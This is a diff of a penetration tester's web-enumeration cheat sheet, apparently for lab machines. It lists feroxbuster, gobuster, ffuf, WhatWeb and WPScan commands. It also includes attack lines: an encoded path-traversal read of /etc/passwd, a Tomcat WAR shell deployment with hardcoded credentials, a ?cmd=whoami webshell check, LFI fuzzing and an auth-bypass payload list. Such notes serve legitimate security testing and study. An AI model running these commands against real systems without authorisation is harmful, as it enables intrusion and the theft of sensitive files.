@@ -37,6 +37,7 @@
 ^Web notes:Auth Bypass Wordlist:http://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt # kali-machine
 ^Web notes:Common Wordlist:/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 ^Web notes:Common Wordlist:/usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
+^Web notes:Common Directory:/var/www/html/wordpress #default wordpress directory on Linux
 ^Reminder:For each HTTP(S) service, fingerprint stack/CMS and note versions → run: WhatWeb
 ^Reminder:If you need quick headers/redirects/cookies/auth hints → run: Curl
 ^Reminder:If you need raw HTTP interaction beyond the browser → run: NC
@@ -73,7 +74,7 @@
 NC:nc -vn <target> <port> # Banner grab for web services. Reveals server header and sometimes version; kali-machine
 Curl:curl -I http://<target>:<port>/ # Fetch HTTP headers. Look for server version, cookies, and security headers; kali-machine
 Curl:curl http://<target>:<port>/ # Fetch full page. Review source code for comments and hidden inputs; kali-machine
-Curl:curl -k -v --path-as-is -I https://<target>:<port> # Probe HTTPS headers ignoring certificate errors. Check for TLS versions; kali-machine
+Curl:curl -k -v --path-as-is -I https://<target>:<port> # Probe HTTPS headers ignoring certificate errors. kali-machine
 Curl:curl -k -A 'Mozilla/5.0' http://<target>:<port>/ # Use custom User-Agent to bypass simple filtering; kali-machine
 Curl:curl -s -O http://<target>:<port>/index.html # Download file for offline analysis; kali-machine
 Curl:curl -b 'PHPSESSID=<cookie>' http://<target>:<port>/ # Use authenticated session cookie for post-login enumeration; kali-machine
@@ -92,11 +93,14 @@ Curl:false || curl -s "http://<target>:<port>/?cmd=whoami" | grep -i "root" # Qu
 Curl:curl 'http://<target>/forgot?username=robert-dev-14522' -H 'Host:<target>:8081' # Test host header injection for password reset poisoning; kali-machine
 Curl:curl -u tomcat:\$3cureP4s5w0rd123! -T shell.war http://megahosting.htb:8080/manager/text/deploy # Deploy WAR file to Tomcat manager. If successful, get shell at /shell; kali-machine
 Curl:curl -u tomcat:\$3cureP4s5w0rd123! http://megahosting.htb:8080/manager/text/list # List deployed applications; kali-machine
+Curl:curl -k -i --path-as-is http://<target>:<port>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd #bypass path normalization to exploit LFI and read sensitive files; kali-machine
 
 ^Feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -L4 -e # Directory busting with extensions. Look for 200/403/301 responses; kali-machine
 Feroxbuster:feroxbuster -u http://<domain> -t 10 -w <wordlist1> -x "txt,html,php,asp,aspx,jsp" -v -k -n -e # Directory busting on domain name; kali-machine
-Feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> --filter-status 400,401,403,404 -L 2 # Filter out common non-interesting status codes; kali-machine
+Feroxbuster:feroxbuster -u http://<target>:<port>/ -t 10 -w <wordlist1> --filter-status 400,401,403,404 -L2 # Filter out common non-interesting status codes; kali-machine
+Feroxbuster:feroxbuster -u http://<target>:<port>/ -x "txt,html,php,asp,aspx,jsp" -d 4 -vv #recursive web fuzzing; kali-machine
 
+Gobuster:gobuster dir -u http://<target>:<port>/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,txt,html,bak,old -v #directory brute-force with extensions; kali-machine
 Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -s 307,200,204,301,302,403 -t 50 # Directory busting with status filtering; kali-machine
 Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> # Save results to file for later review; kali-machine
 Gobuster:gobuster dir -u http://<target>:<port>/ -w <wordlist1> -t 50 -o <filename1> -x "php,txt,aspx" # Include file extensions in search; kali-machine
@@ -106,6 +110,7 @@ Gobuster:gobuster vhost -u http://<target>:<port>/ -w <wordlist1> -o <filename1>
 Gobuster:gobuster dns -d <domain> -w dns-jhaddix.txt # DNS subdomain brute-force. Add discovered subdomains to /etc/hosts; kali-machine
 
 FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ # Fast directory discovery; kali-machine
+FFUF:ffuf -u http://<target>:<port>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -v #directory fuzzing using ffuf; kali-machine
 FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/FUZZ -mc all -fs 42 -c -v # Filter by response size to hide false positives; kali-machine
 FFUF:ffuf -w <wordlist1> -u http://<target>:<port>/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d '{"email":"FUZZ@casp.casp","password":"dummy"}' -r --fc 401 -t 50 -mr "incorrect" -o <filename1> #fuzz POST login parameter using wordlist by replacing FUZZ in email field, follow redirects (-r), filter out 401 responses (--fc 401), match responses containing "incorrect" (-mr), use -fr to filter regex, and save results to output file; kali-machine
 FFUF:ffuf -u http://<domain>:<port>/FUZZ/ -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt # Use raft wordlist for thorough discovery; kali-machine
@@ -117,6 +122,8 @@ FFUF:ffuf -w <wordlist1>:FUZZ -u 'http://<target>:<port>/xxx.php?language=FUZZ' 
 FFUF:ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target>:<port>/index.php?page=FUZZ -fc 404 -fs 0 -c #fuzz LFI paths and filter empty responses for faster discovery; kali-machine
 FFUF:ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<target>:<port>/index.php?FUZZ=test -fc 404 -c #discover hidden parameters that may lead to LFI; kali-machine
 FFUF:ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target>:<port>/index.php?page=FUZZ -fc 404 -c -t 40 #multi-threaded LFI fuzzing for faster enumeration; kali-machine
+FFUF:ffuf -u http://<target>:<port>/ -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -v #discover virtual hosts; kali-machine
+
 WFuzz:wfuzz -u http://<target>:<port> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069 # Subdomain fuzzing with size filter; kali-machine
 
 ^Hosts Helper:printf '%s %s\n' "<target>" "$(curl -fsSL http://<target>:<port>/ | grep -aoE 'https?://[^"[:space:]]+|[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}' | sed -E 's~^https?://~~; s~/.*~~; s/.*@//; s/:.*$//' | sort -u | paste -sd' ' -)" # Scrape URLs/emails from page, normalize to hostnames for /etc/hosts; kali-machine
@@ -127,6 +134,7 @@ Nikto:nikto -h http://<target>:<port>/ # Comprehensive web vulnerability scanner
 Nikto:nikto -h https://<target>:<port> -ssl # Scan HTTPS site; kali-machine
 
 WhatWeb:whatweb http://<target>:<port>/ # Web technology fingerprinting. Identifies CMS, frameworks, and versions; kali-machine
+WhatWeb:whatweb -a 4 -v http://<target>:<port>/ #web technology fingerprinting; kali-machine
 WhatWeb:whatweb --aggression 3 http://<target>:<port>/ # More aggressive fingerprinting; kali-machine
 
 WPScan #1:wpscan --url http://<target>:<port>/ -e vt,tt,u,ap #enumerate WordPress components: vulnerable themes (vt), vulnerable plugins (vp), themes (tt), users (u), and all plugins (ap) to identify attack surface; kali-machine
